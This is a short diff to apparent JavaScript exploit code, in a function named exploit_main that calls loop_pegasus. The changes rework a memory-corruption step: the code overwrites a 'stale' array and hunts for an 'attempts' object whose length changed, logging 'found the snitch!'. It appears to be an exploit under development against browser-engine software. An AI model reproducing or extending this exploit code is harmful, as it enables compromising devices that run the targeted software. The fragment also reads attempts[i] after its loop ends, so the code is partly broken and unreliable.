@@ -75,14 +75,27 @@ exploit_main = function(){
 	var corrupted = loop_pegasus();
 	var stale = corrupted["stale"];
 	var attempts = corrupted["attempts"];
-
+	
+	//modify length loop
 	for(var i = 0; i < 15000; i++){
-		//debug(attempts[0]);
 		stale[i] = 0x0FFFFFFF - i;
+		debug(attempts[i].length);
+		if(attempts[i].length != 20){
+			debug(i);
+			return corrupted;
+		}
 	}
+	
 
+	//release info
+	debug("found the snitch!");
+	debug(attempts[i].length);
+	debug(0x0FFFFFFF - attempts[i].length);
+	return corrupted;
+
+	/*
 	for(var i = 0; i < attempts.length; i++){
-		if(attempts[i].length != 20) {
+		if(attempts[0].length != 20) {
 			debug(i);
 			debug("found the snitch!", i);
 			debug(attempts[i].length);
@@ -90,6 +103,9 @@ exploit_main = function(){
 			return corrupted;
 		}
 	}
+	*/
+
+
 	//debug("done");
 	return corrupted;
 }
